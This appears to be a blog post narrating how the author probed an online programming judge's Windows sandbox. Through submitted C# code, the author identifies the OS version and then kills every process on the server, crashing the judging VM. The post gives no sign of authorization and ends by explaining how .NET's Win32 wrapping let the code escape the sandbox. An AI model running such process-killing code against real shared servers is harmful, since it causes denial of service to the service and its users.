The Dig

Seeing what code I can execute on the server!

Episode 1:

So my previous playing with the server code-checker had helped me find one important thing. The checker ran on Windows.

C:\Users\CONTES~1\AppData\Local\Temp

Now I opted for finding which version of Windows.

private static void Main(string[] args)
{
    Console.WriteLine(Environment.OSVersion);
}

And there we have it.

Microsoft Windows NT 6.1.7601 Service Pack 1

Knowing it’s windows offered something vital. I knew he had to nail the sandboxing otherwise the server is..well, we’ll see.

I thought about shutting down the server using normal methods:

command line
wmi

None of them worked as the process didn’t have enough permissions to access any system-level operations.

So what else could cause windows to go crazy? Processes! If you don’t control your access modifiers then we can pretty much do anything here. I tried a simple approach that I didn’t think would work.

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;

namespace Codeforces
{
    internal class Program
    {
        static void Main(string[] args)
        {
            var processes = Process.GetProcesses();

            processes.ToList().ForEach(i => i.Kill());
        }
    }
}

and to my surprise the invoker never returned! That VM went off causing the submissions queue to pile up until physically corrected.

This escalated to thinking why the sandbox was able to leak calls to other processes when it clearly shouldn’t. So I went to Microsoft Reference and checked how GetProcesses worked and it turned out that the .NET Framework Wraps the Win32 API and that’s why I was able to communicate with other processes outside of my sandbox.
